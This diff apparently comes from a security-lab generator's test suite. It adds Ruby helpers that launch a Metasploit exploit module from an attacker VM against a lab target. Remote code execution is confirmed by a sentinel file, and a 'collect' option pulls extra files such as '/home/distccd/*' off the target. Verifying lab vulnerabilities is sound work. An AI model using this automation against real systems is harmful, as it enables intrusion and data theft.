@@ -344,6 +344,122 @@ class PostProvisionTest
     proxmox_connection.qemu_agent_get_ip(vmid, node)
   end
 
+  # The SecGen checkout root (the project lives at <root>/projects/<id>).
+  def secgen_root
+    File.expand_path('../../', get_project_path)
+  end
+
+  # [[system_name, base_module_path], ...] for every system in the project,
+  # read from the resolved projects/<id>/scenario.xml (no secrets in it).
+  def project_systems
+    @project_systems ||= begin
+      xml = File.read("#{get_project_path}/scenario.xml")
+      xml.scan(/<system>.*?<\/system>/m).map do |block|
+        name = block[/<system_name>\s*(.*?)\s*<\/system_name>/m, 1]
+        base = block[/<base[^>]*\bmodule_path="([^"]+)"/m, 1]
+        [name, base]
+      end.reject { |n, _| n.nil? }
+    end
+  rescue StandardError
+    []
+  end
+
+  # Does the base module at this path declare <type>wanted</type>?
+  def base_has_type?(base_module_path, wanted)
+    return false if base_module_path.nil?
+    meta = "#{secgen_root}/#{base_module_path}/secgen_metadata.xml"
+    return false unless File.exist?(meta)
+    File.read(meta).scan(/<type>\s*(.*?)\s*<\/type>/m).flatten.include?(wanted)
+  rescue StandardError
+    false
+  end
+
+  # Name of the sibling system acting as the attacker: the first *other* system
+  # whose base is type 'attack' (e.g. a Kali base). nil if there isn't one, so
+  # callers SKIP cleanly on a single-VM run. Override by passing an explicit
+  # name to the exploit helpers.
+  def attack_system
+    return @attack_system if defined?(@attack_system)
+    @attack_system = project_systems
+                     .reject { |name, _| name == get_system_name }
+                     .find { |_, base| base_has_type?(base, 'attack') }
+                     &.first
+  end
+
+  # --- Metasploit exploit helper (tier 3) ---------------------------------
+  # Drive a Metasploit exploit module from the attacker VM against this system
+  # (the target under test) and record a tier-3 PASS/FAIL/SKIP.
+  #
+  # The default payload is the no-session cmd/unix/generic: the exploit runs a
+  # command *on the target*, so there is no reverse/bind shell to race. Proof of
+  # RCE is a sentinel file the command leaves on the target, which we read back
+  # over the target's own guest agent and check for `uid=`. `collect:` appends
+  # extra shell (e.g. 'cat /home/distccd/*') whose output is captured into the
+  # sentinel as evidence. `options:` adds/overrides msf datastore settings
+  # (RHOSTS/RPORT/PAYLOAD/CMD are set for you; pass LHOST etc. here if needed).
+  #
+  #   test_msf_exploit('exploit/unix/misc/distcc_exec',
+  #                    rport: 3632, collect: 'cat /home/distccd/*')
+  def test_msf_exploit(msf_module, rhost: nil, rport: self.port, attacker: nil,
+                       payload: 'cmd/unix/generic', collect: nil,
+                       options: {}, tier: 3, label: nil)
+    name = label || "msf exploit (#{msf_module})"
+
+    unless proxmox?
+      skip_check(name, 'msf exploit tests run only on the Proxmox pipeline', tier: tier)
+      return
+    end
+    attacker ||= attack_system
+    unless attacker && system_present?(attacker)
+      skip_check(name, "No attacker (base type='attack') system in this project; exploit skipped", tier: tier)
+      return
+    end
+    rhost ||= system_ip                 # may SKIP if the target IP can't be resolved
+    attacker_ip = other_system_ip(attacker)
+    if rhost.nil? || attacker_ip.nil?
+      skip_check(name, "Could not resolve target (#{rhost.inspect}) or attacker (#{attacker_ip.inspect}) IP", tier: tier)
+      return
+    end
+
+    nonce = "#{Time.now.to_i}_#{rand(100000)}"
+    sentinel = "/tmp/secgen_pwned_#{nonce}"
+    cmd = "id > #{sentinel}; uname -n >> #{sentinel}; "
+    cmd += "#{collect} >> #{sentinel} 2>/dev/null; " if collect
+    cmd += "chmod 644 #{sentinel}"
+
+    settings = { 'RHOSTS' => rhost, 'RPORT' => rport, 'PAYLOAD' => payload, 'CMD' => cmd }
+    settings.merge!(options.map { |k, v| [k.to_s, v] }.to_h)
+    set_lines = settings.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')
+
+    # HOME must be exported: the guest agent runs commands with no HOME, and
+    # msfconsole's rb-readline aborts on startup without it.
+    msf = "export HOME=/root TERM=dumb; msfconsole -q -x \"use #{msf_module}; " \
+          "#{set_lines} run; sleep 8; exit -y\""
+    result = run_on_system(attacker, msf, timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 600).to_i)
+    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
+    add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")
+
+    body = run_vagrant_ssh("cat #{sentinel} 2>/dev/null", timeout: 30)[:stdout].to_s
+    add_evidence('sentinel_on_target', "echo #{Shellwords.escape(body)}") unless body.empty?
+
+    if body =~ /uid=\d+/
+      pass_check(name,
+                 "RCE confirmed: #{msf_module} from #{attacker} (#{attacker_ip}) ran a command on the target (#{rhost}); sentinel #{sentinel} contains #{body[/uid=\S+/]}.",
+                 tier: tier)
+    else
+      fail_check(name,
+                 "Exploit did not confirm RCE: sentinel #{sentinel} absent or empty on the target. See msf_output evidence.",
+                 tier: tier)
+    end
+  end
+
+  # Render an msf datastore value for a `set` line inside the -x string: quote
+  # in single quotes if it contains whitespace or shell metacharacters.
+  def msf_set_value(value)
+    s = value.to_s
+    s =~ /[\s;'"|&<>$`]/ ? "'#{s.gsub("'", %q('\\''))}'" : s
+  end
+
   # Run a shell command as the given account (login shell, that user's
   # environment) rather than root.
   def run_as_user(user, command, timeout: 30)
